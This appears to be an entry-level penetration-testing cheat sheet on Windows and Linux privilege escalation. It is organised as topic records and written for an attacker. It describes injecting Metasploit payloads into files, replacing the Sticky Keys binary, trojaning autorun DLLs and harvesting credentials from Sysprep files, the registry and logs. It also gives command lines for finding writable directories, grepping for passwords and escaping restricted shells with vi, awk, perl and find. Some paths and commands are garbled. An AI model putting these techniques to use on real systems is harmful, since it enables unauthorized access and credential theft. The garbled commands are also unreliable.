Users are great targets because they have legitimate access to critical assets, additionally they have Domain User status on the network letting the browse system files shares, net commands, and other things SYSTEM cannot.

Metasploit console is an excellent tool to for injecting this malicious code into common file formats, as all the tools already exist and you can deploy your own personalized payloads or add to the repository that currently exists.
You can use Metasploits File Formatter via: use exploit/OPERATINGSYSTEM/fileformat/tool

Topics.Name: AT Command
Topics.Description:
In Windows privilege escalation it's quite simple to escalate privileges using the at command for scheduling tasks
The at command schedules a task differently than 'schtasks' which schedules tasks as the user account, at schedules the task as SYSTEM giving instant privilege escalation.
NOTE: In more modern operating systems at has been depreciated and is uniformly adopting schtasks.

Topics.Name: Binary Replacement
Topics.Description:
Replacing binaries in Windows is a great way to escalate privilege however requires a unprivileged account to do.
Replacing Stickykeys is a great example found in: C:/windows/system32/setchc.exe then upon triggering stickykeys will execute your binary.

Topics.Name: Clear Text/Base64 Credentials
Topics.Description:
Often left behind by OEM manufacturers or SYS admins even found in network drives on Windows domains plaintext passwords for administrator accounts
Base64 credentials are just as common found in MS Sysprep files in XML format show passwords in base64 encoded. Sysprep is used as a System Preparation Tool for automatic deployment and configuration of windows systems.

Topics.Name: Registry Credentials
Topics.Description:
The registry is a great place to find credentials, sometimes encrypted or in plain text. The registry can be accessed by two means, through the GUI Regedit program or by using reg command line tool.
Example query: reg query 'HKLM/SOFTWARE/MICROSOFT/WINDOWS NT/Currentversion/Winlogon'
SNMP: HKLM/SYSTEM/CurrentControlSet/Services/SNMP/
Putty: hKcu/Software/SimonTatham/PuTTY/Sessions

Topics.Name: Shatter Attack
Topics.Description:
In Windows XP/2003
Anything running as SYSTEM with a window can be attacked from the command line
Applications that contain:
-Listview/Treeview
-RichTextBox
EditBox
We can use these input/output boxes to output information accessed via the command line.

Topics.Name: Trojaning Autorun
Topics.Description:
By enumerating the autoruns (Applications that run on startup) we can simply replace binaries if possible, or even replace Dynamic Link Libaries being accessed by the applciations to install our own Trojan into a users system.
Using Process Monitor we can view DLLS a program is using and from there we can determine what DLLs we can then replace with our Trojan.

Topics.Name: Orphaned Installs
Topics.Description:
We can use Autoruns in sysinternals to find file references that are missing. We know some application on the system is looking for that file to be ran at some point in time.
We can then create the structure for the missing file and replace that file with whatever we want with a fair amount of certainty that our file will execute again at some point in time.

Topics.Name: Abusing File Permissions
Topics.Description:
You can find world-writable directories for the root user/group:
find / /( -wholename '/home/homedir*' -prune /) -o /( -type d -perm -0002 /) -exec ls -ld '{}' ';' 2>/dev/null | grep roto

You can also use a similar command to find world-writable directories for users:
find / /( -wholename '/home/homedir*' -prune /) -o /( -type d -perm -0002 /) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root

To check if the /root directory is available:
ls -ahlR /root 2>/dev/null

Topics.Name: Searching for Passwords
Topics.Description:
Commands to parse log files for password entries:
find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null

Search /etc/ config files for stored passwords:
find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null

Topics.Name: Enumerate Installed Software
Topics.Description:
Enumerating software can help you exploit the running processes.

For ubuntu:
dpkg -l | awk '{$1=$4=""; print $0}

For CentOS/RHEL:
rpm -qa | sort u

Running processes:
ps aux | awk '{print $1,$2,$9,$10,$11}

Topics.Name: Escape Restricted Shell
Topics.Description:
If the shell is limiting commands or sudo privileges, the attacker can attempt to escape into a global shell:

Using vi:
:!bash
:set shell=/bin/bash:shell

 Using AWK:
awk 'BEGIN {system("/bin/bash")}'

Using PERL:
perl -e 'exec "/bin/bash";

Using Find:
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
